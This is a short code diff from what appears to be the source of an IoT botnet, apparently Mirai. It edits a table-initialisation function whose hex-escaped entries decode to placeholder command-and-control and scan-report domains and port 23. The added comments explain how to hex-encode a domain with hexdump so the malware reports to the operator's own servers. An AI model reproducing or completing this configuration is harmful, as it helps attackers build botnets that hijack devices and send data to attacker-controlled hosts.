@@ -15,6 +15,12 @@ struct table_value table[TABLE_MAX_KEYS];
 
 void table_init(void)
 {
+// removeed obfuscation
+// use the folowing bash magic to create domain or other things for this hexadecimal escaped nonesense
+//
+// $echo example.com | hexdump -e '1/1 "\\\x"' -e '1/1 "%.2x"'
+// \x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x0a
+// remember to add null byte on end
 add_entry(TABLE_CNC_DOMAIN, "\x63\x6e\x63\x2e\x63\x68\x61\x6e\x67\x65\x6d\x65\x2e\x63\x6f\x6d\x00", 17);
 add_entry(TABLE_CNC_PORT, "\x00\x17", 2);
 add_entry(TABLE_SCAN_CB_DOMAIN, "\x72\x65\x70\x6f\x72\x74\x2e\x63\x68\x61\x6e\x67\x65\x6d\x65\x2e\x63\x6f\x6d\x00", 20);
